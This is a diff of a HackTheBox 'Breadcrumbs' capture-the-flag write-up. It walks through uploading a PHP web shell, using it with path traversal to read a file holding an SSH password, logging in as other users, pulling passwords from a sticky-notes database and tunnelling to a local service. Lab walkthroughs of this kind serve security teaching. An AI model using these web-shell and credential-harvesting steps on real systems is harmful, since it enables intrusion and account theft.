@@ -1,8 +1,12 @@
+### HACKTHEBOX BREADCRUMBS WRITEUP
+
 Lets go straight in,
+
+`echo "10.10.10.228 breadcrumbs.htb" | sudo tee -a /etc/hosts`
 
 we have a PHP website, I use an extension called wappalyzer which quickly tells us what technology is the webpage using,
 
-searching for the books and authors on the website, at this URL => http://10.10.10.228/php/books.php
+searching for the books and authors on the website, at this URL => http://breadcrumbs.htb/php/books.php
 we see some requests going on in the background, which we can relay to burp suite
 
 <img width="461" alt="bookcontroller" src="https://user-images.githubusercontent.com/60816781/126033342-a2e2dc0b-a000-403c-90db-0187d6649a0b.png">
@@ -45,7 +49,7 @@ at first, I tried uploading a full reverse shell which has thrown errors, and af
 request to upload a cmd.php
 ```
 POST /portal/includes/fileController.php HTTP/1.1
-Host: 10.10.10.228
+Host: breadcrumbs.htb
 <SNIP>
 Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
 
@@ -66,12 +70,12 @@ after this we can see a cmd.php in the uploads directory, portal/uploads,
 
 I've got a little command to enumerate this a bit more easily,
 
-`curl http://10.10.10.228/portal/uploads/cmd.php\?cmd\="type+..\\..\\..\\..\\..\\..\\..\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserData\\juliette.json`
+`curl http://breadcrumbs.htb/portal/uploads/cmd.php\?cmd\="type+..\\..\\..\\..\\..\\..\\..\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserData\\juliette.json`
 
 so using this request, we can a bit more conveniently enumerate the file system now, after some time we got the above file `juliette.json`, in which we find the ssh password for juliette
 
 now, lets ssh as juliette,
-`ssh juliette@10.10.10.228`
+`ssh juliette@breadcrumbs.htb`
 
 now, we have to do more enumeration.
 Basically, when we go into the juliette desktop directory we see two files, which are user flag and one other `todo.html`
@@ -83,7 +87,7 @@ this says there might be some stored passwords in the sticky notes, now lets go 
 to find some useful DB files, we need not use a DB application to see the stuff that is useful to us in this file,
 if we do a `type plum.sqlite-wal`, we can see some data dump into the console, if we observe carefully, we have the password for development user
 
-Lets login as development, `ssh development@10.10.10.228`
+Lets login as development, `ssh development@breadcrumbs.htb`
 
 Now I was clueless for quite some time as the development user, but once we get into the c:\development directory, we can see a Linux binary here, which, if we just run a simple strings.exe on it, we can see a request that it is doing on a site,
 
@@ -93,7 +97,7 @@ If we had run an `netstat -an` once we got juliette or development to take a loo
 
 lets run an ssh tunnel now,
 
-`ssh -L 80:127.0.0.1:1234 development@10.10.10.228`
+`ssh -L 80:127.0.0.1:1234 development@breadcrumbs.htb`
 
 <img width="750" alt="Screenshot 2021-07-17 at 15 35 00" src="https://user-images.githubusercontent.com/60816781/126033488-2541c0e9-619e-4b3f-9f26-ea69a3ab7292.png">
 
